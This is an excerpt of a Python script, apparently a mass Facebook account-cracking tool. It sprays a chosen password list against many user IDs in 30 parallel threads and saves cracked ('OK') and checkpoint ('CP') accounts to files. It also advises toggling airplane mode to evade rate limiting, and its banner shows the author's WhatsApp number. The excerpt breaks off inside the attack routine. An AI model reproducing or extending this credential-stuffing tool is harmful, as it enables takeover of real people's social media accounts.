...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://SASANKaprvv.blogspot.com/2022/07/SASANKaprvv.html').text
			if basesplit in plr:
				key = basesplit
...
╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR  :SASANK XHETRI \033[1;32m[SASANK]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m SSC4-07\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  +9779845788110           │
\033[1;36m│ [✓] FELLING : \x1b[1;32mPRO HORNY🥵\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [SASANK] [SSC-4]\x1b[0m    
 """)
		...
		print("%s [%s2%s]%s CRACK RANDOMLY FB ID 2011-13 %s(PRO)"%(R,G,R,Y,G))
		...
		print(GET)
		os.system('xdg-open https://www.facebook.com/SASANK077')
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK SSC09 707-> ok.txt"%(G))
				print("%s [+] CP SSC09 707-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SASANK] : %s/%s -> \033[0;92m [ SSC-OK:%s ]- \033[0;91m[SSC-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
